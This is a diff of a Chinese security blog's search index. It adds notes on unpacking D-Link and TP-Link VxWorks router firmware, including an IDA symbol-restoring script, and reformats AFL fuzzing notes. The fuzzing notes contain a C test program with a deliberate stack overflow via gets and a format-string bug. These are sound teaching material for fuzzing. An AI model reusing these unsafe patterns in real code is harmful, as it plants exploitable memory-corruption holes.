@@ -1,6 +1,248 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>固件解压分析工具及方法整理</title>
+    <url>/post/7dc2b2.html</url>
+    <content><![CDATA[<p>整理一些基本的概念和一些固件解压的方法，不能太依赖<code>binwalk</code>，如果<code>binwalk</code>解压不出来，那岂不是一点招都没有了。</p>
+<h2 id="固件"><a href="#固件" class="headerlink" title="固件"></a>固件</h2><p>固件不是硬件，而是软件。在嵌入式设备中，通常是被固化在只读存储器中，所以被称为固件。</p>
+<h2 id="文件系统"><a href="#文件系统" class="headerlink" title="文件系统"></a>文件系统</h2><p>文件系统是操作系统的重要组成部分，是操作运行的基础。但是不同的嵌入式设备使用的文件系统都不一样。根文件系统会被打包成当前路由器所使用的文件系统格式，然后组装到固件中。</p>
+<p>嵌入式设备中肯定希望文件系统越小越好，因为在路由器设备中，存储设备的大小是分厂有限的，所以这些文件系统中各种压缩格式随处可见。</p>
+<p><code>Squashfs</code>是一个只读格式的文件系统。当系统启动后，会将文件系统保存在一个压缩过的文件系统中，这个文件可以使用换回的形式挂在并对其中的文件进行访问，当程序需要访问某些文件时，仅对部分的压缩文件解压缩。<code>Squashfs</code>常用的压缩格式有<code>Gzip</code>,<code>LZMA</code>,<code>LZO</code>,<code>XZ(LZMA2)</code>。嵌入式设备的根文件系统会按照<code>Squashfs</code>文件系统常用压缩格式中的一种进行打包，形成一个完整的<code>Squashfs</code>文件系统，然后与路由器操作系统的内核一起形成固件。</p>
+<a id="more"></a>
+
+
+<h2 id="提取常用工具"><a href="#提取常用工具" class="headerlink" title="提取常用工具"></a>提取常用工具</h2><h3 id="Linux自带工具"><a href="#Linux自带工具" class="headerlink" title="Linux自带工具"></a>Linux自带工具</h3><ul>
+<li><code>file</code> 用来检测是否是有效的文件和文件类型</li>
+<li><code>xxd</code> 会生成给定文件或者输入的十六进制格式</li>
+<li><code>hexdump</code> 16进制查看工具</li>
+<li><code>strings</code> 展示输入程序中可识别的字符串</li>
+<li><code>dd</code>  用于复制文件并对原文件的内容进行转换和格式化处理 </li>
+<li><code>lzma</code> 解压<code>LZMA</code>文件</li>
+<li><code>grep</code>超级牛逼的文本搜索工具</li>
+<li><code>unsquashfs</code> 用于解压<code>squashfs</code>的文件格式</li>
+</ul>
+<p>这里提供两个网站，如果看不懂命令可以直接上去查。</p>
+<ul>
+<li><a href="https://man.linuxde.net/" target="_blank" rel="noopener">https://man.linuxde.net/</a></li>
+<li><a href="https://www.explainshell.com/" target="_blank" rel="noopener">https://www.explainshell.com/</a></li>
+</ul>
+<h3 id="第三方工具"><a href="#第三方工具" class="headerlink" title="第三方工具"></a>第三方工具</h3><ul>
+<li><code>Binwalk</code></li>
+<li><code>IDA</code></li>
+<li><code>ghidra</code> 相比于IDA，这个更适合嵌入式分析</li>
+<li><a href="https://github.com/rampageX/firmware-mod-kit" target="_blank" rel="noopener">firmware-mod-kit</a></li>
+</ul>
+<p>关于工具的安装就不提了，详细参考<a href="https://blog.pwntools.xyz/2019/10/18/IoT测试环境搭建/#more">IoT测试环境搭建</a></p>
+<h2 id="手动解压固件"><a href="#手动解压固件" class="headerlink" title="手动解压固件"></a>手动解压固件</h2><p>这里随便找一款<code>Dlink</code>的路由器的固件来分析,型号是<code>Dlink dir-815</code>，<code>Binwalk</code>分以一下固件的熵，如果很高，作为练习就可以换一款了。</p>
+<p>使用<code>file</code>查看文件:</p>
+<p><img src="http://file.smilehacker.net/image-20191103194436077.png" alt="image-20191103194436077"></p>
+<p><code>file</code>没有发现符合的任何文件类型的匹配，但是不代表固件就是完全没接触过的格式。因为file是从首字节开始的，他会按照内部的数据进行比对。</p>
+<h3 id="手动判断文件类型"><a href="#手动判断文件类型" class="headerlink" title="手动判断文件类型"></a>手动判断文件类型</h3><p><code>file</code>没有发现符合的文件格式，我们就需要采用下面的方法分析.</p>
+<ol>
+<li>“strings|grep”检索文件系统的<code>magic</code>签名头</li>
+<li>“hexdumo|grep” 检索<code>magic</code>签名的偏移</li>
+<li>“dd|file”确认<code>magic</code>签名偏移处的文件系统。</li>
+</ol>
+<p>文件系统的<code>magic</code>签名头是指一个文件系统中包含的一串可识别字符，有了这串字符，表明该文件可能包含某个文件系统。当然，如果要确认包含的文件系统，还需要利用其他条件配合证命，(2，3做的)</p>
+<h4 id="检索magic签名头"><a href="#检索magic签名头" class="headerlink" title="检索magic签名头"></a>检索<code>magic</code>签名头</h4><p>头部的特征都是根据每种文件系统开头的几百字节提炼出来的。常用的如下:</p>
+<ul>
+<li><code>cramfs</code>文件系统头部特征为<code>0x28cd3d45</code></li>
+<li><code>squashfs</code>文件系统头部特征较多，其中一些是标准的<code>squashfs</code>头部,有些是老外研究发现的大概有<code>sqsh</code>,<code>hsqs</code>,<code>qshs</code>,<code>shsq</code>,<code>hsqt</code>,<code>tqsh</code>,<code>sqlz</code>这七种。</li>
+</ul>
+<p>先检查是否存在<code>cfamfs</code>文件系统头部特征。因为我们不知道文件系统时大端序还是小端序，我们需要执行两次</p>
+<pre><code class="shell">strings DIR_815.bin | grep `python -c &#39;print &quot;\x28\xcd\x3d\x45&quot;&#39;`
+strings DIR_815.bin | grep `python -c &#39;print &quot;\x45\x3d\xcd\x28&quot;&#39;`</code></pre>
+<p><img src="http://file.smilehacker.net/image-20191103195839036.png" alt="image-20191103195839036"></p>
+<p>没有发现<code>cfamfs</code>的头部特征，然后使用相同的办法，去检查是否存在<code>squashfs</code>的头部特征</p>
+<p><img src="http://file.smilehacker.net/image-20191103200044122.png" alt="image-20191103200044122"></p>
+<p>找到了一个，但是我们不能确定该文件是不是一个<code>squashfs</code>文件系统，还需要进一步确定。</p>
+<h4 id="确定文件系统"><a href="#确定文件系统" class="headerlink" title="确定文件系统"></a>确定文件系统</h4><p>使用如下命令检测是否针对包含<code>squashfs</code>文件系统。</p>
+<pre><code class="shell">hexdump -C DIR_815.bin | grep -n &#39;hsqs&#39;
+
+# hexdump -C参数: 输出规范的十六进制和ASCII码。
+# grep -n参数: 在显示符合范本样式的那一列之前，标示出该列的编号。</code></pre>
+<p><img src="http://file.smilehacker.net/image-20191103200559319.png" alt="image-20191103200559319"></p>
+<p>在偏移<code>0x000f008C</code>处发现了<code>hsqs</code>,我们从<code>0x000f0080C</code>这个地方复制<code>100</code>字节数据，再使用<code>file</code>命令查看。使用<code>dd</code>命令</p>
+<p>为什么时100字节？因为<code>squashfs</code>文件系统的头部校验不会超过100字节</p>
+<pre><code class="shell">dd if=DIR_815.bin bs=1 count=100 skip=983180 of=test
+
+# dd 可以跨文件、设备、分区和卷复制数据
+# if 标准文件输入
+# of 标准文件输出
+# bs 块大小
+# skip 用于跳过指向固件二进制映像中特定地址的指针</code></pre>
+<p><img src="http://file.smilehacker.net/image-20191103201356488.png" alt="image-20191103201356488"></p>
+<p>这次就识别出来了。一定注意这里的文件大小<code>2808054</code></p>
+<h3 id="手动提取固件"><a href="#手动提取固件" class="headerlink" title="手动提取固件"></a>手动提取固件</h3><p>我们知道了在固件偏移<code>983180(0x000f0080C)</code>的地方，我们继续用<code>dd</code>提取出文件文件，然后尝试手动提取。</p>
+<pre><code class="shell">dd if=DIR_815.bin bs=1 skip=983180 count=2808054 of=test </code></pre>
+<p>这里一定要指定<code>count</code>，直接提取到文件末尾。在这中间我们还需要检查<code>squashfs</code>使用的压缩算法。</p>
+<p><img src="http://file.smilehacker.net/image-20191103233812796.png" alt="image-20191103233812796"></p>
+<p>可以看到时<code>lzma</code>的格式，我们可以使用ubuntu自带的<code>unsquashfs</code>来解压，但是这个工具并不好用，我们可以使用<code>firmware-mod-kit</code>来解压。其实<code>firmware-mod-kit</code>也是调用<code>binwalk</code>来做的</p>
+<pre><code class="shell">./unsquashfs_all.sh ../Desktop/dir815_FW_101/_DIR_815.bin.extracted/F008C.squashfs</code></pre>
+<p><img src="http://file.smilehacker.net/image-20191105181148263.png" alt="image-20191105181148263"></p>
+<p>可以在目录下看到我们解压出来的文件</p>
+<p><img src="http://file.smilehacker.net/image-20191105181232646.png" alt="image-20191105181232646"></p>
+<h2 id="自动解压固件"><a href="#自动解压固件" class="headerlink" title="自动解压固件"></a>自动解压固件</h2><p>自动解压固件就不多介绍了，<code>binwalk -Me</code>直接解压，在这里记录一下<code>binwalk</code>的几个用法</p>
+<h3 id="扫描文件头"><a href="#扫描文件头" class="headerlink" title="扫描文件头"></a>扫描文件头</h3><pre><code class="shell">binwalk DIR_815.bin</code></pre>
+<p><img src="http://file.smilehacker.net/image-20191103205700709.png" alt="image-20191103205700709"></p>
+<h3 id="Binwalk递归解压固件"><a href="#Binwalk递归解压固件" class="headerlink" title="Binwalk递归解压固件"></a>Binwalk递归解压固件</h3><pre><code class="shell">binwalk -Me DIR_815.bin</code></pre>
+<p>解压的明明白白</p>
+<p><img src="http://file.smilehacker.net/image-20191103205819179.png" alt="image-20191103205819179"></p>
+<h3 id="Binwalk识别大端序小端序"><a href="#Binwalk识别大端序小端序" class="headerlink" title="Binwalk识别大端序小端序"></a>Binwalk识别大端序小端序</h3><pre><code class="shell">binwalk -A DIR_815.bin</code></pre>
+<p>不是很准确</p>
+<h3 id="Binwalk-熵值分析"><a href="#Binwalk-熵值分析" class="headerlink" title="Binwalk 熵值分析"></a>Binwalk 熵值分析</h3><pre><code class="shell">binwalk -E DIR_815.bin
+
+# python2需要安装sudo apt-get install python-matplotlib
+# python3需要安装sudo apt-get install python3-matplotlib</code></pre>
+<p>根据熵值可以判断该固件是否加密。</p>
+<p><img src="http://file.smilehacker.net/image-20191105174637703.png" alt="image-20191105174637703"></p>
+<p>  简单地说，一个系统越是有序，信息熵就越低；反之，一个系统越是混乱，信息熵就越高。 </p>
+<p><code>Binwalk</code>没什么好说的，看看官方文档就好了。</p>
+<h2 id="Vxworks固件解压及IDA修复过程-ghidra"><a href="#Vxworks固件解压及IDA修复过程-ghidra" class="headerlink" title="Vxworks固件解压及IDA修复过程(ghidra)"></a>Vxworks固件解压及IDA修复过程(ghidra)</h2><p>搞一个<code>TPLINK</code>的路由器，之前没搞过，跟普通的文件系统不太一样。但是网上的文章并不是很多，而且没有一个总结的非常清楚。这里记录一下，也不是非常清楚。</p>
+<p>TPlink基于<code>Vxworks</code>的路由器没有像<code>Linux</code>版本的根文件系统，整个系统就是一个大的bin文件，只要把bootloader加载到合适的位置就直接运行了。</p>
+<h3 id="使用Binwalk初步分析固件"><a href="#使用Binwalk初步分析固件" class="headerlink" title="使用Binwalk初步分析固件"></a>使用<code>Binwalk</code>初步分析固件</h3><p>先使用<code>binwalk</code>对文件进行扫描，看有没有什么敏感信息</p>
+<p><img src="http://file.smilehacker.net/image-20191105182511902.png" alt="image-20191105182511902"></p>
+<p>除了开头的<strong>uImage header</strong>之外其余全都是<code>LZMA</code>压缩之后的数据，但是注意红框内的数据，<code>Binwalk</code>显示出来的大小，一个为<code>-1</code>，另一个为<code>3580296</code>，这两个都不太寻常，我们先看大小为<code>3M</code>的这份数据，他比其他的<code>lzma</code>压缩之后的数据要大的多，其中有可能包含一些数据。我们直接用<code>binwalk</code>解压，尽量不要给自己找事(用<code>dd</code>解压)</p>
+<pre><code class="shell">binwalk -e firmware.bin
+
+# dd解压的方法
+dd if=firmware.bin of=10400.lzma skip=66560 bs=1 count=1241152 # 1307712-66560
+
+# lzma 解压
+lzma -d 10400.lzma</code></pre>
+<p>发现解压不出来。</p>
+<p><img src="http://file.smilehacker.net/image-20191106153809813.png" alt="image-20191106153809813"></p>
+<p>我们用winhex打开固件看看<code>0x13F440</code>处的到底是什么数据。</p>
+<p><img src="http://file.smilehacker.net/image-20191106153957693.png" alt="image-20191106153957693"></p>
+<p>这里看上去明显不像是数据的结尾。我们往上翻一翻。</p>
+<p><img src="http://file.smilehacker.net/image-20191106164741622.png" alt="image-20191106164741622"></p>
+<p><code>13E6F4</code>好像更像时数据的结尾，我们将数据复制出来，并用<code>lzma</code>解压</p>
+<pre><code class="shell">dd if=WDR_7660_V1.0_2.0.16_190325.bin of=10400.lzma skip=66560 bs=1 count=1237748
+
+lzma -d 10400.lzma</code></pre>
+<p><img src="http://file.smilehacker.net/image-20191106165240644.png" alt="image-20191106165240644"></p>
+<p>这个跟<code>binwalk -e</code>解压出来的结果一摸一样。这里记录以下一个解压的过程。</p>
+<h3 id="使用IDA分析10400"><a href="#使用IDA分析10400" class="headerlink" title="使用IDA分析10400"></a>使用IDA分析10400</h3><p> 由于IDA Pro无法识别该文件，提示为”Binary file”，因此需要确定CPU的架构及加载基址。在”uImage header”部分已经有一些信息，如下，可以看到CPU架构为<code>arm</code>。 </p>
+<p><img src="http://file.smilehacker.net/image-20191106165829158.png" alt="image-20191106165829158"></p>
+<p> 在<code>uImage header</code>中有一个<code>Entry Point</code>地址<code>0x41C00000</code>，这个地址可能是<code>uBoo</code>t程序的加载基址，而不是<code>10400</code>文件的加载基址。采用该地址作为加载基址，虽然也能识别出<code>2000</code>多个函数，但在后续导入符号表时会对不上。 </p>
+<p>使用<code>Binwalk</code>识别程序是大端序还是小端序</p>
+<p><img src="http://file.smilehacker.net/image-20191106170029255.png" alt="image-20191106170029255"></p>
+<p>现在我们还是差一个入口地址，这个地址要怎么找到？</p>
+<h3 id="固件加载地址分析"><a href="#固件加载地址分析" class="headerlink" title="固件加载地址分析"></a>固件加载地址分析</h3><p>这里目前的文章并没有说清楚这个地址是怎么来的，给人更多的感觉像猜出来的。。但是能解决问题就行。我们使用<code>Winhex</code>加载固件后，来到地址<code>0x10400</code>，然后将数据往前翻，在不远处你会发现这个地址。两处地址同时指向<code>0x40205000</code>。</p>
+<p><img src="http://file.smilehacker.net/image-20191105182421398.png" alt="image-20191105182421398"></p>
+<p>这里还有一些其他的方法，参见：</p>
+<ul>
+<li><a href="https://paper.seebug.org/771/" target="_blank" rel="noopener">https://paper.seebug.org/771/</a>  </li>
+<li><a href="http://file.smilehacker.net/%E4%BD%BF%E7%94%A8Ghidra%E5%88%86%E6%9E%90VxWorks%E5%9B%BA%E4%BB%B6-%E6%9C%B1%E6%96%87%E5%93%B2-20190802.pdf" target="_blank" rel="noopener">使用Ghidra分析VxWorks固件-朱文哲-20190802.pdf</a></li>
+<li><a href="https://www.jianshu.com/p/12d8f509169c" target="_blank" rel="noopener">https://www.jianshu.com/p/12d8f509169c</a>  </li>
+</ul>
+<blockquote>
+<p>第一个跟第二个PDF将的差不多，都是同一个人写的，里面介绍了好几种方法,但是都不太适合我，因为10400导入IDA之后是大段乱码的，并没有识别出<code>UsrInit</code>函数，关于定位BSS清理函数在后期可以试一下</p>
+<p>第三篇文章将的其实也在PDF中有提到过，主要时利用内嵌符号表来分析加载地址。但是很不巧，我这里是一个外部的符号表，并不能直接拿来计算。</p>
+</blockquote>
+<p>IDA加载过程如下</p>
+<p>选择对应的架构平台，并设置加载地址</p>
+<p><img src="http://file.smilehacker.net/image-20191106173136394.png" alt="image-20191106173136394"></p>
+<p><img src="http://file.smilehacker.net/image-20191106173315351.png" alt="image-20191106173315351"></p>
+<p>加载成功后你会发现识别出来的函数很少,<code>Import</code>和<code>export</code>都是空的，而且。。没有符号表</p>
+<p><img src="http://file.smilehacker.net/image-20191106173426913.png" alt="image-20191106173426913"></p>
+<p>接下来我们就要城市修复符号表了</p>
+<h3 id="修复符号表"><a href="#修复符号表" class="headerlink" title="修复符号表"></a>修复符号表</h3><p> 使用<code>binwalk</code>直接提取该固件，在提取后的目录中搜索包含<code>VxWorks</code>中的某个关键函数如<code>bzero</code>的文件，如下 </p>
+<pre><code class="shell">grep -r bzero</code></pre>
+<p><img src="http://file.smilehacker.net/image-20191106173810837.png" alt="image-20191106173810837"></p>
+<p>发现<code>140B96</code>中发现了这个字符串，我们用strings查看下他内部的字符串</p>
+<p><img src="http://file.smilehacker.net/image-20191106175319206.png" alt="image-20191106175319206"></p>
+<p>可以看到有非常多的函数名，那他就是符号表无疑了。使用<code>hexdump</code>查看其内容,并计算字符串</p>
+<p><img src="http://file.smilehacker.net/image-20191106174558913.png" alt="image-20191106174558913"></p>
+<p>除了标记出来的，剩下的都是数据了，我们来计算一下符号名表的偏移。</p>
+<blockquote>
+<p>8(自身长度) + 8 (每组数据的长度) * 31ba(总共这么多个字符串)=18DD8</p>
+</blockquote>
+<p>之后使用hexdump查看下<code>18DD8</code>处的数据</p>
+<p><img src="http://file.smilehacker.net/image-20191106175050303.png" alt="image-20191106175050303"></p>
+<p>可以看到计算无误，正好是符号名表的开始。加下来使用如下IDA脚本批量导入符号表。</p>
+<pre><code class="python">import idautils
+import idc
+import idaapi
+
+symfile_path = &#39;./140B96&#39;    # 符号文件
+symbols_table_start = 8
+strings_table_start = 0x18DD8 # 字符串表偏移的地址
+
+with open(symfile_path, &#39;rb&#39;) as f:
+    symfile_contents = f.read()
+
+symbols_table = symfile_contents[symbols_table_start:strings_table_start]
+strings_table = symfile_contents[strings_table_start:]
+
+def get_string_by_offset(offset):
+    index = 0
+    while True:
+        if strings_table[offset+index] != &#39;\x00&#39;:
+            index += 1
+        else:
+            break
+    return strings_table[offset:offset+index]
+
+
+def get_symbols_metadata():
+    symbols = []
+    for offset in xrange(0, len(symbols_table),8):
+        symbol_item = symbols_table[offset:offset+8]
+        flag = symbol_item[0]
+        string_offset = int(symbol_item[1:4].encode(&#39;hex&#39;), 16)
+        string_name = get_string_by_offset(string_offset)
+        target_address = int(symbol_item[-4:].encode(&#39;hex&#39;), 16)
+        symbols.append((flag, string_name, target_address))
+    return symbols
+
+
+def add_symbols(symbols_meta_data):
+    for flag, string_name, target_address in symbols_meta_data:
+        idc.MakeName(target_address, string_name)
+        if flag == &#39;\x54&#39;:
+            idc.MakeCode(target_address)
+            idc.MakeFunction(target_address)
+
+
+if __name__ == &quot;__main__&quot;:
+    symbols_metadata = get_symbols_metadata()
+    add_symbols(symbols_metadata)</code></pre>
+<p>使用IDA运行此脚本，结果如下。</p>
+<p><img src="http://file.smilehacker.net/image-20191106175803536.png" alt="image-20191106175803536"></p>
+<p>识别出来了大部分函数以及近8000个函数</p>
+<h3 id="Ghidra-加载符号表"><a href="#Ghidra-加载符号表" class="headerlink" title="Ghidra 加载符号表"></a>Ghidra 加载符号表</h3><p>银河实验室开发了一个<code>vxhunter</code>，专门用于<code>vxworks</code>，但是测试了一下实际效果并不好。</p>
+<ul>
+<li>下载地址: <a href="https://github.com/PAGalaxyLab/vxhunter" target="_blank" rel="noopener">vxhunter</a></li>
+</ul>
+<p>只能字节写脚本了。这里不太方便放出。</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
+<li><p><a href="http://zeroyu.xyz/2019/08/15/How_to_start_IoT_Reverse/" target="_blank" rel="noopener">http://zeroyu.xyz/2019/08/15/How_to_start_IoT_Reverse/</a>   </p>
+</li>
+<li><p>&lt;&lt;解密家用路由器0day挖掘技术&gt;&gt;</p>
+</li>
+<li><p><a href="https://cq674350529.github.io/2018/09/19/TP-Link-wr886v6-固件解析/" target="_blank" rel="noopener">https://cq674350529.github.io/2018/09/19/TP-Link-wr886v6-%E5%9B%BA%E4%BB%B6%E8%A7%A3%E6%9E%90/</a> </p>
+</li>
+<li><p><a href="https://www.freebuf.com/sectool/75915.html" target="_blank" rel="noopener">https://www.freebuf.com/sectool/75915.html</a> </p>
+</li>
+<li><p><a href="https://paper.seebug.org/771/" target="_blank" rel="noopener">https://paper.seebug.org/771/</a> </p>
+</li>
+<li><p><a href="http://galaxylab.com.cn/0x00-tp-link-wr886nv7-v1-1-0-路由器分析-固件初步分析/" target="_blank" rel="noopener">http://galaxylab.com.cn/0x00-tp-link-wr886nv7-v1-1-0-%e8%b7%af%e7%94%b1%e5%99%a8%e5%88%86%e6%9e%90-%e5%9b%ba%e4%bb%b6%e5%88%9d%e6%ad%a5%e5%88%86%e6%9e%90/</a> </p>
+</li>
+<li><p><a href="http://file.smilehacker.net/%E4%BD%BF%E7%94%A8Ghidra%E5%88%86%E6%9E%90VxWorks%E5%9B%BA%E4%BB%B6-%E6%9C%B1%E6%96%87%E5%93%B2-20190802.pdf" target="_blank" rel="noopener">使用Ghidra分析VxWorks固件-朱文哲-20190802.pdf</a></p>
+</li>
+</ul>
+]]></content>
+      <categories>
+        <category>IoT</category>
+      </categories>
+      <tags>
+        <tag>IoT</tag>
+        <tag>固件</tag>
+        <tag>分析</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>内网渗透 - 环境搭建</title>
     <url>/post/704fc7a0.html</url>
     <content><![CDATA[<h2 id="内网渗透-环境搭建"><a href="#内网渗透-环境搭建" class="headerlink" title="内网渗透 - 环境搭建"></a>内网渗透 - 环境搭建</h2><p>因为自身的原因，必须从对内网渗透进行一次总结。这次写文章来记录一下整个复习的过程</p>
@@ -131,16 +373,53 @@
     <url>/post/35374.html</url>
     <content><![CDATA[<h2 id="AFL-Fuzzing-study-notes"><a href="#AFL-Fuzzing-study-notes" class="headerlink" title="AFL Fuzzing study notes"></a>AFL Fuzzing study notes</h2><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>本文采用的测试环境是<code>ubuntu 16.04</code></p>
 <p><code>AFL</code>下载地址: <a href="http://lcamtuf.coredump.cx/afl/" target="_blank" rel="noopener">http://lcamtuf.coredump.cx/afl/</a> </p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tar -zxvf afl-latest.tgz	# 解压代码</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 编译安装</span></span><br><span class="line">cd afl-2.52b</span><br><span class="line">make </span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure>
+<pre><code class="shell">tar -zxvf afl-latest.tgz    # 解压代码
 
+# 编译安装
+cd afl-2.52b
+make 
+sudo make install</code></pre>
 <p>不出意外可以直接编译成功,之后在终端输入<code>afl-</code>,按两下<code>tab</code>,会出现一些命令</p>
 <p><img src="http://file.smilehacker.net/1570950620531.png" alt="1570950620531"></p>
 <a id="more"></a>
 
 
 <h2 id="有源码AFL测试-源码插桩"><a href="#有源码AFL测试-源码插桩" class="headerlink" title="有源码AFL测试-源码插桩"></a>有源码AFL测试-源码插桩</h2><p>测试代码如下:</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vuln</span><span class="params">(<span class="keyword">char</span> *str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> len = <span class="built_in">strlen</span>(str);</span><br><span class="line">    <span class="keyword">if</span>(str[<span class="number">0</span>] == <span class="string">'A'</span> &amp;&amp; len == <span class="number">66</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        raise(SIGSEGV);</span><br><span class="line">        <span class="comment">//如果输入的字符串的首字符为A并且长度为66，则异常退出</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(str[<span class="number">0</span>] == <span class="string">'F'</span> &amp;&amp; len == <span class="number">6</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        raise(SIGSEGV);</span><br><span class="line">        <span class="comment">//如果输入的字符串的首字符为F并且长度为6，则异常退出</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"it is good!\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">100</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    gets(buf);<span class="comment">//存在栈溢出漏洞</span></span><br><span class="line">    <span class="built_in">printf</span>(buf);<span class="comment">//存在格式化字符串漏洞</span></span><br><span class="line">    vuln(buf);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="c">#include &lt;stdio.h&gt; 
+#include &lt;stdlib.h&gt; 
+#include &lt;unistd.h&gt; 
+#include &lt;string.h&gt; 
+#include &lt;signal.h&gt; 
 
+int vuln(char *str)
+{
+    int len = strlen(str);
+    if(str[0] == &#39;A&#39; &amp;&amp; len == 66)
+    {
+        raise(SIGSEGV);
+        //如果输入的字符串的首字符为A并且长度为66，则异常退出
+    }
+    else if(str[0] == &#39;F&#39; &amp;&amp; len == 6)
+    {
+        raise(SIGSEGV);
+        //如果输入的字符串的首字符为F并且长度为6，则异常退出
+    }
+    else
+    {
+        printf(&quot;it is good!\n&quot;);
+    }
+    return 0;
+}
+
+int main(int argc, char *argv[])
+{
+    char buf[100]={0};
+    gets(buf);//存在栈溢出漏洞
+    printf(buf);//存在格式化字符串漏洞
+    vuln(buf);
+
+    return 0;
+}</code></pre>
 <p><code>afl-fuzz</code>基本流程</p>
 <ul>
 <li>使用<code>afl-gcc</code>对代码进行插桩编译</li>
@@ -149,44 +428,34 @@
 <li><code>afl</code>会在<code>testcase</code>的基础上自动变异输入，让程序<code>crash</code>，并记录<code>crash</code>信息</li>
 </ul>
 <h3 id="插桩编译"><a href="#插桩编译" class="headerlink" title="插桩编译"></a>插桩编译</h3><p>将上面的程序用<code>afl-gcc</code>编译</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">afl-gcc -g -o afl_test afl_test.c</span><br></pre></td></tr></table></figure>
-
+<pre><code class="shell">afl-gcc -g -o afl_test afl_test.c</code></pre>
 <p>如果是编译C++源码，就要将<code>afl-gcc</code>替换成<code>afl-g++</code></p>
 <p>接着建立两个文件<code>afl_in</code>，<code>afl_out</code>用来存放程序的输入和<code>Fuzz</code>输出的结果。</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir afl_in afl_out</span><br></pre></td></tr></table></figure>
-
+<pre><code class="shell">mkdir afl_in afl_out</code></pre>
 <p>到此，还需要一个<code>testcase</code>文件，将<code>testcase</code>文件中的内容喂给程序</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo "aaa" &gt; afl_in/testcase  # testcase中的内容可以为任意内容</span><br></pre></td></tr></table></figure>
-
+<pre><code class="shell">echo &quot;aaa&quot; &gt; afl_in/testcase  # testcase中的内容可以为任意内容</code></pre>
 <p><strong>备注:</strong></p>
 <p>目标程序中有<code>makefile</code>文件，分两种情况</p>
 <ol>
 <li><p>程序用<code>autoconf</code>构建</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./configure CC="afl-gcc" CXX="afl-g++"</span><br></pre></td></tr></table></figure>
-
+<pre><code class="shell">./configure CC=&quot;afl-gcc&quot; CXX=&quot;afl-g++&quot;</code></pre>
 <p> 此外，还可以执行如下语句设置<code>LD_LIBRARY_PATH</code>让程序加载经过<code>AFL</code>插桩的<code>.so</code>文件，进行静态构建而不是动态链接 </p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./configure --disable-shared CC="afl-gcc" CXX="afl-g++"</span><br></pre></td></tr></table></figure>
+<pre><code class="shell">./configure --disable-shared CC=&quot;afl-gcc&quot; CXX=&quot;afl-g++&quot;</code></pre>
 </li>
 <li><p>程序不是<code>autoconf</code>构建， 那么直接修改Makefile文件中的编译器为<code>afl-gcc/g++</code>。</p>
 <p> 为了后期更好的分析crash，在此处可以开启<code>Address Sanitizer(ASAN)</code>这个内存检测工具，此工具可以更好的检测出缓存区溢出、<code>UAF</code>等内存漏洞，开启方法如下: </p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">AFL_USE_ASAN=1 ./configure CC=afl-gcc CXX=afl-g++ LD=afl-gcc--disable-shared</span><br><span class="line">AFL_USE_ASAN=1 make</span><br></pre></td></tr></table></figure>
-
-
-
+<pre><code class="shell">AFL_USE_ASAN=1 ./configure CC=afl-gcc CXX=afl-g++ LD=afl-gcc--disable-shared
+AFL_USE_ASAN=1 make</code></pre>
 </li>
 </ol>
-<pre><code>不使用 `AFL`编译插桩时，可使用以下方式开启 `Address Sanitizer`</code></pre>   <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">./configure CC=gcc CXX=g++ CFLAGS=&quot;-g -fsanitize=address&quot;</span><br></pre></td></tr></table></figure>
-
-
-
+<pre><code>不使用 `AFL`编译插桩时，可使用以下方式开启 `Address Sanitizer`</code></pre><pre><code class="shel">   ./configure CC=gcc CXX=g++ CFLAGS=&quot;-g -fsanitize=address&quot;</code></pre>
 <h3 id="开始Fuzz"><a href="#开始Fuzz" class="headerlink" title="开始Fuzz"></a>开始Fuzz</h3><p><code>Fuzz</code>的语法一般有两种</p>
 <ol>
 <li><p>直接从<code>stdin</code>读取输入的目标程序</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">afl-fuzz -i testcase_dir -o findings_dir /path/to/program […params…]</span><br></pre></td></tr></table></figure>
+<pre><code class="shell">afl-fuzz -i testcase_dir -o findings_dir /path/to/program […params…]</code></pre>
 </li>
